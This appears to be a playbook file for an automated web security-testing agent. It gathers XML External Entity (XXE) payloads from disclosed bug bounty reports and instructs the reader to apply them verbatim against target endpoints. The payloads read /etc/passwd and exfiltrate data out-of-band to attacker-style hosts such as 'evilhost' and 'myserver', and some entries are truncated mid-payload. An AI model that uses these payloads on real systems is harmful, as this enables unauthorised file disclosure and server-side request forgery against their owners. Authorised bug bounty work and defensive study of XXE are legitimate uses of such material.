---
name: hunter-l4-xxe
description: "Test and exploit XXE for file disclosure / SSRF with real payloads."
domain: cybersecurity
subdomain: web
tags:
- web
- xxe
- hunting
- l4
version: '1.0'
---
# L4 Playbook: XXE (hunter)

**L3 technique sheet:** `knowledge/sheets/xxe.md` — (pending L3 synthesis)

## When to use
Attack a target surface for XXE. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1028396 [ajaysenr]
- endpoint: `GET /conferences/get_recording_slides_xml.xml`
- parameter: `url`
- payload: `https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml`
- root cause: The fetched XML is parsed with an insecure XML parser that allows external entities.
- impact: XML External Entity (XXE) possible via the url parameter when parsing attacker-controlled XML (program-confirmed).

### 105434 [ajaysenr]
- endpoint: `POST / (import project XLSX)`
- parameter: `uploaded xlsx`
- payload: `<!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>`
- root cause: The XML parser processes DOCTYPE external entities in the XLSX sheet XML during project import.
- impact: Read the full /etc/passwd file (contents shown) via XXE when importing the crafted XLSX file.

### 105753 [ajaysenr]
- endpoint: `POST /ma/api/v2/user/login`
- parameter: `XML body`
- payload: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
<login><user`
- root cause: The XML login endpoint resolves external entities and exfiltrates file contents out-of-band via FTP.
- impact: Retrieved /etc/passwd via blind XXE, exfiltrated out-of-band to the attacker's server (xxe_app.png).

### 105787 [ajaysenr]
- endpoint: `POST / (file upload feature)`
- parameter: `uploaded file`
- payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
- root cause: The file upload feature parses uploaded XML with external entities enabled.
- impact: Per program summary, the attacker successfully executed XXE in a file upload feature.

### 105980 [ajaysenr]
- endpoint: `POST /user/login`
- parameter: `XML body`
- payload: `<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
<a>wlrm-scnr</a>`
- root cause: Improper XML parser configuration allows external entity resolution, enabling arbitrary file reads and server-side HTTP requests.
- impact: Server made an outbound HTTP GET to wallarm.tools/ok (confirmed in server access.log), proving blind XXE.

### 106797 [ajaysenr]
- endpoint: `POST /api/rest/mpapi/infaMPAPISearchWebService/query`
- parameter: `query`
- payload: `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [  
<!ENTITY % b SYSTEM "file:///etc/passwd">
<!ENTITY % asd SYSTEM "http://evilhost/xx.html">  %asd;  %rrr;]>
<params>
<offset>0</`
- root cause: The endpoint accepted XML (despite being a JSON API) and JAXB processed external entities without disabling them, enabling arbitrary file read and OOB
- impact: Confirmed arbitrary file read (JAXBException resolved /etc/passwd1) and exfiltrated /etc/passwd via an out-of-band XXE vector.

### 1095645 [ajaysenr]
- endpoint: `POST media upload (WordPress Media Library)`
- payload: `xxe.wav (crafted .wav with external DTD xxe.dtd to extract /etc/passwd)`
- root cause: On PHP 8 the Media Library parses XML with LIBXML_NOENT, which re-enables external entity substitution despite the deprecation of libxml_disable_entit
- impact: Extracted /etc/passwd (appeared base64-encoded in attacker access logs) by uploading a malicious .wav; also enables DoS, SSRF, and Phar deserializatio

### 114476 [ajaysenr]
- endpoint: `PUT /import users (YouTrack XML import)`
- payload: `<?xml version="1.0"?>
<!DOCTYPE list [
<!ENTITY % xxe SYSTEM "http://myserver/xxe-test">
%xxe;
]>
<list></list>`
- root cause: The YouTrack XML user-import parser loaded external entities without validation.
- impact: XXE triggered an outbound GET from VK's server (87.240.169.26) to an attacker-controlled host, and enabled arbitrary file read, FTP-based file exfiltr

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

